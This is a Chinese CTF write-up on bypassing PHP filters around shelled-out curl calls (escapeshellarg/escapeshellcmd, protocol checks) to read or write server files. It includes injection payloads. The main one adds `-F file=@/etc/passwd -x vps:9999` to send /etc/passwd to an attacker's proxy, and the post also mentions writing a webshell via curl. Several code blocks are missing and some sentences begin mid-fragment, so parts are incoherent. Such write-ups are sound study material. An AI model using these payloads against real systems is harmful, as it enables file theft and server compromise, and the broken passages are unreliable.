# 绕过限制利用curl读取写入文件
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 本篇原创文章参加双倍稿费活动，预估稿费为600元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)
## 说明
最近做了一道wonderkun师傅出的一道CTF的题目，学到了很多的姿势，包括PHP的函数用法以及curl的用法。一般都是利用curl来发送HTTP的请求，可是在实际的漏洞利用过程，curl却是一个非常好的利用工具。因为Linux系统中一般都会自带curl工具，其次是curl支持file协议，意味着我们能够读取本地文件。
所以在很多实际情况下，我们不得不使用curl，但是我们又要防止被攻击者利用读取我们系统本地的文件，那么我们一般都会加上校验代码，对于传入的curl的参数进行校验。但是很多时候由于开发者的安全意识不够，我们还是能够绕过校验读取敏感文件。
而本篇文章就是在CTF的题目上加上我自己的思考，用以说明curl的用法或者说是绕过不同类型的过滤代码。
## curl写文件
如果有一段这样的代码，如下：
     指定输出文件名称`。那么问题就很简单了，直接curl读取远程文件，写入成为一个webshell。  
读取文件:
在服务器上面写入了webshell。
## curl 转发
如果在服务器上面禁止写入文件，那么上面通过写入webshell来读取文件的方式就行不通了。读取文件必须使用到`file`协议，但是又限制了`$url`的协议必须为`http`或者是`https`，那么我是否可以通过跳转的方式，将`http`跳转到`file`协议呢？  
我在我的vps创建一个`redirect.php`文件，如下：
    ^()[]{}$`, `x0A` 和 `xFF`, `'` 和 `"`仅在不配对儿的时候被转义
以下就是使用的效果，如下：
在字符串增加了引号同时会进行转义，那么之前的payload`http://192.168.158.131/test/index.php?url=http://xxx.com
-T
/etc/passwd`的方式就无法使用了，因为增加了`'`进行了转义，所以整个字符串会被当成参数。注意`escapeshellcmd`的问题是在于如果`'`和`"`仅在不配对儿的时候被转义。那么如果我们多增加一个`'`就可以扰乱之前的转义了。如下：
但是这样并不会成功。在本地进行尝试的时候，显示结果如下:
    spoock@ubuntu:/var/www/html/ctf$ curl 'http://192.168.158.131/ctf/index.php'\'' -T /etc/passwd'
    curl: Can't open '/etc/passwd''!
    curl: try 'curl --help' or 'curl --manual' for more information
无法识别文件`/etc/passwd'`，那么只能使用其他的方法了。在curl中存在`-F`提交表单的方法，也可以提交文件。`-F 
向服务器POST表单，例如：curl -F "web=[@index](https://github.com/index
"@index").html;type=text/html"
url.com`。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的``的影响。那么最后的payload为：
    http://baidu.com/' -F file=@/etc/passwd -x  vps:9999
最终运行的结果是`curl 'http://baidu.com/'\'' -F file=@/etc/passwd -x
vps:9999'`，对于`'http://baidu.com/'\''`来说，由于`\`是转义的``，后面的一对`'`直接可以忽略了，所以实际上执行的是`curl
'http://baidu.com/'`。代理`-x vps:9999'`后面的`'`对于代理也没有影响，因此最后就能够正常地执行了。
在vps上面监听9999端口，就可以顺利地收到服务器发送过来的`/etc/passwd`文件，但是这个问题是在于对于服务器上面的`curl`版本有要求，不是所有的版本的都能够执行成功。以下我进行的测试：  
在7.47上面无法成功：
在7.38上面顺利执行:
在7.19上面也是可以顺利执行的。  
根据猜测，可能在是新版本中，先会执行`curl
http`的操作，但是由于在后面增加了``,例如`http://127.0.0.1`，但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。
## 总结
通过这个漏洞，还是学习到了很多关于`curl`的用法，以及`escapeshellarg`和`escapeshellcmd`造成的问题。关于`header("Location:
file://///etc/passwd");`这种方式不成功，希望有大佬能够指点一下。
## 参考
[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)